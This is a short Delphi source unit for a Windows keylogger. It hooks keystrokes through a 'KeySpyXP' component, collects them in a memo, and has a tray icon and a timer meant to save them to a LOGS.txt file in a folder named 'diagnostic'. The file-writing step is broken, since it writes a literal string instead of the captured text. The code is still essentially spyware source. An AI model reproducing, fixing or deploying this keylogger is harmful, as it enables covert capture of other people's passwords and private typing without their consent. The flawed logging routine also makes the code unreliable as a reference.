unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, KeySpyXP, registry, CoolTrayIcon, ExtCtrls;

type
  TForm1 = class(TForm)
    KeySpyXP1: TKeySpyXP;
    Memo1: TMemo;
    ScrollBar1: TScrollBar;
    CoolTrayIcon1: TCoolTrayIcon;
    SaveDialog1: TSaveDialog;
    Timer1: TTimer;
    OpenDialog1: TOpenDialog;
    procedure KeySpyXP1Key(Sender: TObject; key: String);
    procedure Timer1Timer(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  tf:textfile;


implementation

{$R *.dfm}

procedure TForm1.KeySpyXP1Key(Sender: TObject; key: String);
begin
if key[1]='{' then
memo1.lines.add(key) else
memo1.Text:=memo1.text+key;
end;



procedure TForm1.Timer1Timer(Sender: TObject);
begin


  AssignFile(TF, 'C:\Program Files\Borland\Delphi7\Projects\diagnostic\v2\LOGS.txt');
  try
    ReWrite(TF);
    Writeln('memo1.Text;');
  finally
    CloseFile(TF);
  end;

end;
end.
